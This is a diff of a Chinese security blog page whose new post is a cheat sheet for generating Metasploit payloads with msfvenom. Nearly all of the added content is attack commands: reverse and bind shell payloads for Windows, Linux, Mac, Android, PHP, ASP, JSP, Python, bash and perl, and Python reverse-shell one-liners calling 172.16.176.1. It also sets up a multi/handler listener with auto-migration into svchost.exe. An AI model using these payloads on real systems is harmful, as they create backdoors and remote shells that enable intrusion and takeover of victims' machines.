@@ -17,14 +17,8 @@ var _hmt = _hmt || [];
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="kali使用anonsurf配合tor匿名上网, ssooking&#39;s blog">
-    <meta name="description" content="整个系统应用TOR匿名，Anonsurf在后台运行并不断更改IP地址。
-
-注意，国内环境下前提是你的kali能够翻&amp;amp;墙
-
-安装配置torapt-get install tor
-
-去bridges.torproject.org获取br">
+    <meta name="keywords" content="msfvenom生成payload, ssooking&#39;s blog">
+    <meta name="description" content="msfvenom重要参数查看payloads: msfvenom --list payloads查看支持的文件格式：msfvenom --help-formats查看payload所需参数：msfvenom -p xxx --payload">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -32,7 +26,7 @@ var _hmt = _hmt || [];
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>kali使用anonsurf配合tor匿名上网 | ssooking&#39;s blog</title>
+    <title>msfvenom生成payload | ssooking&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -273,13 +267,13 @@ var _hmt = _hmt || [];
 
 
 
-<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        kali使用anonsurf配合tor匿名上网
+                        msfvenom生成payload
                     </div>
                 </div>
             </div>
@@ -390,16 +384,16 @@ var _hmt = _hmt || [];
             
             <div class="article-tag">
                 
-                <a href="/tags/kali/" target="_blank">
-                    <span class="chip bg-color">kali</span>
+                <a href="/tags/metasploit/" target="_blank">
+                    <span class="chip bg-color">metasploit</span>
                 </a>
                 
-                <a href="/tags/linux/" target="_blank">
-                    <span class="chip bg-color">linux</span>
+                <a href="/tags/RAT/" target="_blank">
+                    <span class="chip bg-color">RAT</span>
                 </a>
                 
-                <a href="/tags/tor/" target="_blank">
-                    <span class="chip bg-color">tor</span>
+                <a href="/tags/木马后门/" target="_blank">
+                    <span class="chip bg-color">木马后门</span>
                 </a>
                 
             </div>
@@ -409,102 +403,100 @@ var _hmt = _hmt || [];
                 <span class="post-cate">
                     <i class="fa fa-bookmark fa-fw icon-category"></i>
                     
-                    <a href="/categories/科学上网/" class="post-category" target="_blank">
-                        科学上网
+                    <a href="/categories/攻防渗透/" class="post-category" target="_blank">
+                        攻防渗透
+                    </a>
+                    
+                    <a href="/categories/攻防渗透/神兵利器/" class="post-category" target="_blank">
+                        神兵利器
                     </a>
                     
                 </span>
                 
 
                 <span class="post-date">
-                    <i class="fa fa-clock-o fa-fw"></i>2017-10-14
+                    <i class="fa fa-clock-o fa-fw"></i>2016-11-15
                 </span>
             </div>
         </div>
         <hr>
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>整个系统应用TOR匿名，<code>Anonsurf</code>在后台运行并不断更改IP地址。</p>
-<blockquote>
-<p>注意，国内环境下前提是你的kali能够翻&amp;墙</p>
-</blockquote>
-<h1 id="安装配置tor"><a href="#安装配置tor" class="headerlink" title="安装配置tor"></a>安装配置tor</h1><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> tor
+                <h1 id="msfvenom重要参数"><a href="#msfvenom重要参数" class="headerlink" title="msfvenom重要参数"></a>msfvenom重要参数</h1><p>查看payloads: <code>msfvenom --list payloads</code><br>查看支持的文件格式：<code>msfvenom --help-formats</code><br>查看<code>payload</code>所需参数：<code>msfvenom -p xxx --payload-options</code></p>
+<p>编码参数</p>
+<pre class=" language-bash"><code class="language-bash">-e x86/shikata_ga_nai -i 5 -b <span class="token string">"\x00"</span> //使用shikata_ga_nai编码器编码5次并去除空字符
 </code></pre>
-<p>去<code>bridges.torproject.org</code>获取bridges信息，然后修改<code>/etc/tor/torrc</code>文件，添加如下内容：</p>
-<pre class=" language-bash"><code class="language-bash">Bridge 158.69.204.189:990 5A5103F99EDA9E2F136CE38F3C041C0D67320EFC
-Bridge 77.198.28.226:37911 E27AAA7EE9F15324A02115ADD85136295F796211
-Bridge 96.230.139.74:9001 5F3B7E2CDB9D420F9FBAC6C764BA62D49CF68DE3
+<h1 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h1><pre class=" language-bash"><code class="language-bash">windows/shell_bind_tcp
+windows/meterpreter/bind_tcp
+windows/meterpreter/reverse_tcp
+windows/x64/meterpreter/reverse_tcp
+linux/x86/shell_bind_tcp
+linux/x86/meterpreter_reverse_tcp
+</code></pre>
+<h2 id="System-Payloads"><a href="#System-Payloads" class="headerlink" title="System Payloads"></a>System Payloads</h2><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f elf <span class="token operator">></span> shell.elf
+</code></pre>
+<h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>messagebox Test</p>
+<pre class=" language-bash"><code class="language-bash">msfvenom -a x86 -p windows/messagebox TEXT<span class="token operator">=</span><span class="token string">"hello, it is a test"</span>
+</code></pre>
+<p>windows下生成32位/64位payload时需要注意。</p>
+<pre class=" language-bash"><code class="language-bash">msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f exe <span class="token operator">></span> shell.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f exe <span class="token operator">></span> shell.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f exe <span class="token operator">></span> shell.exe
+</code></pre>
+<p>以<code>windows/meterpreter/reverse_tcp</code>为例，该payload默认为32位，也可使用<code>-a x86</code>选项指定。</p>
+<p>如果要生成64位，则payload为<code>windows/x64/meterpreter/reverse_tcp</code>。</p>
+<h3 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h3><p>nc正向连接</p>
+<pre class=" language-bash"><code class="language-bash">msfvenom -p windows/shell_hidden_bind_tcp rhost<span class="token operator">=</span>192.168.0.107 lport<span class="token operator">=</span>8956 -f exe<span class="token operator">></span> 1.exe      
+</code></pre>
+<p> nc反向连接，监听</p>
+<pre class=" language-bash"><code class="language-bash">msfvenom -p windows/shell_reverse_tcp lhost<span class="token operator">=</span>192.168.0.107 lport<span class="token operator">=</span>888 -f exe<span class="token operator">></span> 1.exe
+</code></pre>
+<h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p osx/x86/shell_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f macho <span class="token operator">></span> shell.macho
+</code></pre>
+<h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><pre class=" language-bash"><code class="language-bash">msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.apk
+</code></pre>
+<h2 id="Web-Payloads"><a href="#Web-Payloads" class="headerlink" title="Web Payloads"></a>Web Payloads</h2><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p php/meterpreter_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.php
+<span class="token function">cat</span> shell.php <span class="token operator">|</span> pbcopy <span class="token operator">&amp;&amp;</span> <span class="token keyword">echo</span> <span class="token string">'&lt;?php '</span> <span class="token operator">|</span> <span class="token function">tr</span> -d <span class="token string">'\n'</span> <span class="token operator">></span> shell.php <span class="token operator">&amp;&amp;</span> pbpaste <span class="token operator">>></span> shell.php
+</code></pre>
+<h3 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f asp <span class="token operator">></span> shell.asp
+</code></pre>
+<h3 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.jsp
+</code></pre>
+<h3 id="war"><a href="#war" class="headerlink" title="war"></a>war</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f war <span class="token operator">></span> shell.war
+</code></pre>
+<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p cmd/unix/reverse_python LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.py
+msfvenom -a python -p python/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.py
+</code></pre>
+<p>正向shell</p>
+<pre class=" language-python"><code class="language-python">python<span class="token operator">/</span>python3 <span class="token operator">-</span>c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.176.1",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span>
 
-VirtualAddrNetwork 10.192.0.0/10
-AutomapHostsOnResolve 1
-TransPort 9040
-SocksPort 9050
-DNSPort 53
-RunAsDaemon 1
-SocksListenAddress 127.0.0.1
+python<span class="token operator">/</span>python3 <span class="token operator">-</span>c <span class="token string">"exec(\"import socket, subprocess;s = socket.socket();s.connect(('172.16.176.1',9999))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"</span>
 </code></pre>
-<p>开启tor服务，测试可用性：</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token function">service</span> tor start
-systemctl status tor
-<span class="token function">netstat</span> -antu <span class="token operator">|</span> <span class="token function">grep</span> 9050
-tcp        0      0 127.0.0.1:9050          0.0.0.0:*               LISTEN
+<h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p cmd/unix/reverse_bash LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.sh
 </code></pre>
-<p>此时，为浏览器设置socks5代理，端口设置为<code>9050</code>。此时我们访问任意<code>.onion</code>站点，如<a href="http://3g2upl4pq6kufc4m.onion/" target="_blank" rel="noopener">DuckDuckGo</a>，测试是否处于tor网络下。如果能够正常访问<code>onion</code>网站以及其他网站，说明tor配置正确。</p>
-<h1 id="安装Anonsurf"><a href="#安装Anonsurf" class="headerlink" title="安装Anonsurf"></a>安装Anonsurf</h1><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/Und3rf10w/kali-anonsurf.git
-<span class="token function">cd</span> kali-anonsurf/
-<span class="token function">sudo</span> ./installer.sh
+<h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><pre class=" language-bash"><code class="language-bash">msfvenom -p cmd/unix/reverse_perl LHOST<span class="token operator">=</span>xxx LPORT<span class="token operator">=</span>xxx -f raw <span class="token operator">></span> shell.pl
 </code></pre>
-<p>在Kali Linux，安装完毕后，anonsurf会自动更新编辑<code>/etc/tor/torrc</code>文件并添加以下几行：</p>
-<pre class=" language-bash"><code class="language-bash">VirtualAddrNetwork 10.192.0.0/10
-AutomapHostsOnResolve 1
-TransPort 9040
-SocksPort 9050
-DNSPort 53
-RunAsDaemon 1
+<h1 id="MSF监听"><a href="#MSF监听" class="headerlink" title="MSF监听"></a>MSF监听</h1><pre class=" language-bash"><code class="language-bash">use exploit/multi/handler
+<span class="token keyword">set</span> PAYLOAD <span class="token operator">&lt;</span>Payload name<span class="token operator">></span>
+<span class="token keyword">set</span> RHOST <span class="token operator">&lt;</span>RHOST value<span class="token operator">></span>
+<span class="token keyword">set</span> RPORT <span class="token operator">&lt;</span>RPORT value<span class="token operator">></span>
+<span class="token keyword">set</span> LHOST <span class="token operator">&lt;</span>LHOST value<span class="token operator">></span>
+<span class="token keyword">set</span> LPORT <span class="token operator">&lt;</span>LPORT value<span class="token operator">></span>
+<span class="token keyword">set</span> ExitOnSession <span class="token boolean">false</span>
+exploit -j -z
 </code></pre>
-<p>它还会将解析程序配置更改为以下内容：</p>
-<pre class=" language-bash"><code class="language-bash">nameserver 127.0.0.1
-nameserver 209.222.18.222
-nameserver 209.222.18.218
+<p>其他设置</p>
+<p><code>AutoRunScript</code>：自动执行脚本<br>如：自动执行<code>post/windows/manage/migrate</code> 模块注入其他进程</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token keyword">set</span> AutoRunScript post/windows/manage/migrate
 </code></pre>
-<p>如果你不喜欢使用<a href="https://www.blackmoreops.com/2015/03/01/setup-vpn-on-kali-linux" target="_blank" rel="noopener">专用Internet访问DNS</a>，只需在<code>/etc/init.d/anonsurf</code>脚本中更改以下行中的DNS ：</p>
-<pre class=" language-bash"><code class="language-bash"> <span class="token keyword">echo</span> -e <span class="token string">'nameserver 127.0.0.1\nnameserver 209.222.18.222\nnameserver 209.222.18.218'</span> <span class="token operator">></span> /etc/resolv.conf
- <span class="token keyword">echo</span> -e <span class="token string">" <span class="token variable">$GREEN*</span><span class="token variable">$BLUE</span> Modified resolv.conf to use Tor and Private Internet Access DNS"</span>
+<p>自动注入进程</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token keyword">set</span> prependmigrate <span class="token boolean">true</span>
+<span class="token keyword">set</span> prependmigrateProc svchost.exe
 </code></pre>
-<p>我们可以启动anonsurf，通过tor传输数据：</p>
-<p>以后使用时，我们不必提前开启tor服务，anonsurf会自动帮我们完成。</p>
-<pre class=" language-bash"><code class="language-bash">anonsurf start
+<p>辅助配置</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token keyword">set</span> exitonsession <span class="token boolean">false</span> //可以让建立监听的端口继续保持侦听，可以接受多个session
+<span class="token keyword">set</span> stagerverifysslcert <span class="token boolean">false</span> //防止获取shell的时候出现的SSL_accept错误
 </code></pre>
-<p>关闭anonsurf</p>
-<pre class=" language-bash"><code class="language-bash">anonsurf stop
-</code></pre>
-<p>帮助命令</p>
-<pre class=" language-bash"><code class="language-bash">anonsurf       <span class="token comment" spellcheck="true">#查看帮助</span>
-anonsurf start  <span class="token comment" spellcheck="true">#开启隐身</span>
-anonsurf myip      <span class="token comment" spellcheck="true">#查看自己的ip</span>
-anonsurf restart <span class="token comment" spellcheck="true">#可以更换代理IP</span>
-anonsurf stop      <span class="token comment" spellcheck="true">#停止隐身</span>
-anonsurf starti2p <span class="token comment" spellcheck="true">#开启i2p服务</span>
-anonsurf stopi2p     <span class="token comment" spellcheck="true">#关闭i2p服务</span>
-</code></pre>
-<h1 id="安装I2P-可选"><a href="#安装I2P-可选" class="headerlink" title="安装I2P(可选)"></a>安装I2P(可选)</h1><p>1.添加源</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">"deb https://deb.i2p2.de/ wheezy main"</span> <span class="token operator">>></span> /etc/apt/sources.list
-</code></pre>
-<p>2.添加<code>deb.i2p2.de</code>的<code>public key</code></p>
-<pre class=" language-bash"><code class="language-bash">apt-key adv --recv 67ECE5605BCF1346
-</code></pre>
-<p>如果不添加public key，等会更新时可能会报错如下：</p>
-<pre class=" language-bash"><code class="language-bash">GPG error: https://deb.i2p2.de wheezy InRelease: The following signatures couldn't be verified because the public key is not available: NO_PUBKEY 67ECE5605BCF1346
-</code></pre>
-<p>3.安装i2p</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> update
-<span class="token function">apt-get</span> <span class="token function">install</span> i2p i2p-keyring
-</code></pre>
-<h1 id="测试匿名性"><a href="#测试匿名性" class="headerlink" title="测试匿名性"></a>测试匿名性</h1><p>我们可以使用<code>anonsurf myip</code>命令查看自己的ip是否已经匿名。</p>
-<p>另外，我们可以访问一下网站检查是否泄漏了DNS</p>
-<p><a href="http://dnsleak.com/" target="_blank" rel="noopener">http://dnsleak.com/</a></p>
-<p><a href="https://www.perfect-privacy.com/dns-leaktest/" target="_blank" rel="noopener">https://www.perfect-privacy.com/</a></p>
-<p>在此处检查是否泄漏了IPv6：<a href="http://ipv6leak.com/" target="_blank" rel="noopener">http://ipv6leak.com/</a></p>
 
             </div>
             <hr>
@@ -643,7 +635,7 @@ anonsurf stopi2p     <span class="token comment" spellcheck="true">#关闭i2p服
                     <span class="reprint-tip">转载请注明: </span>
                     <a href="https://ssooking.github.io" class="b-link-green">ssooking's blog</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2017/10/14/kali-shi-yong-anonsurf-pei-he-tor-ni-ming-shang-wang/" class="b-link-green">kali使用anonsurf配合tor匿名上网</a>
+                    <a href="/msfvenom-sheng-cheng-payload/" class="b-link-green">msfvenom生成payload</a>
                 </p>
             </div>
         </div>
@@ -665,27 +657,27 @@ anonsurf stopi2p     <span class="token comment" spellcheck="true">#关闭i2p服
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">上一篇</div>
             <div class="card">
-                <a href="/2017/11/18/jupyter-ji-jupyterlab-an-zhuang-shi-yong/">
+                <a href="/gong-ji-liu-liang-de-qing-xi/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="jupyter及jupyterlab安装使用">
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="攻击流量的清洗">
                         
-                        <span class="card-title">jupyter及jupyterlab安装使用</span>
+                        <span class="card-title">攻击流量的清洗</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">一.jupyter安装及简单使用Jupyther notebook（曾经的Ipython notebook），是一个可以把代码、图像、注释、公式和作图集于一处，实现可读性及可视化分析的工具，支持多种编程语言。官方使用手册。安装前，你需要装好</div>
+                    <div class="summary">前言　　流量清洗是指在全部的网络流量中区分出正常流量和恶意流量，将恶意流量阻断和丢弃，而只将正常的流量交付给服务器。与其他的网络安全检测和防护手段类似，流量清洗也需要考虑漏报率和误报率的问题。通常，漏报率和误报率是一对矛盾，需要通过对检测和</div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2017-11-18
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2017-06-16
                         </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/程序代码/" class="post-category" target="_blank">
-                                    程序代码
+                            <a href="/categories/安全建设/" class="post-category" target="_blank">
+                                    安全建设
                                 </a>
                             
                             
@@ -695,12 +687,12 @@ anonsurf stopi2p     <span class="token comment" spellcheck="true">#关闭i2p服
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/python/" target="_blank">
-                        <span class="chip bg-color">python</span>
+                    <a href="/tags/IDS/" target="_blank">
+                        <span class="chip bg-color">IDS</span>
                     </a>
                     
-                    <a href="/tags/jupyter/" target="_blank">
-                        <span class="chip bg-color">jupyter</span>
+                    <a href="/tags/DDOS/" target="_blank">
+                        <span class="chip bg-color">DDOS</span>
                     </a>
                     
                 </div>
@@ -710,44 +702,53 @@ anonsurf stopi2p     <span class="token comment" spellcheck="true">#关闭i2p服
         
         
         <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">下一篇</div>
+            <div class="article-badge right-badge text-color">本篇</div>
             <div class="card">
-                <a href="/2017/10/10/ctf-xian-xia-fang-yu-zhan/">
+                <a href="/msfvenom-sheng-cheng-payload/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="CTF线下防御战—让你的靶机变成" 铜墙铁壁""="">
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="msfvenom生成payload">
                         
-                        <span class="card-title">CTF线下防御战—让你的靶机变成"铜墙铁壁"</span>
+                        <span class="card-title">msfvenom生成payload</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">一. 前言　　随着CTF的普及，比赛的形式也有了越来越多的花样，对于线下赛来说，开始出现了安全加固或者防御战之类的环节，亦或者因为拿下靶机后不希望其他攻击者进入而进行“争夺”，无论什么形式，这些都需要我们对于服务器的防护工作有所了解。对于线</div>
+                    <div class="summary">msfvenom重要参数查看payloads: msfvenom --list payloads查看支持的文件格式：msfvenom --help-formats查看payload所需参数：msfvenom -p xxx --payload</div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2017-10-10
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2016-11-15
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CTF/" class="post-category" target="_blank">
-                                    CTF
+                            <a href="/categories/攻防渗透/" class="post-category" target="_blank">
+                                    攻防渗透
+                                </a>
+                            
+                            <a href="/categories/攻防渗透/神兵利器/" class="post-category" target="_blank">
+                                    神兵利器
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/linux/" target="_blank">
-                        <span class="chip bg-color">linux</span>
+                    <a href="/tags/metasploit/" target="_blank">
+                        <span class="chip bg-color">metasploit</span>
                     </a>
                     
-                    <a href="/tags/CTF/" target="_blank">
-                        <span class="chip bg-color">CTF</span>
+                    <a href="/tags/RAT/" target="_blank">
+                        <span class="chip bg-color">RAT</span>
+                    </a>
+                    
+                    <a href="/tags/木马后门/" target="_blank">
+                        <span class="chip bg-color">木马后门</span>
                     </a>
                     
                 </div>
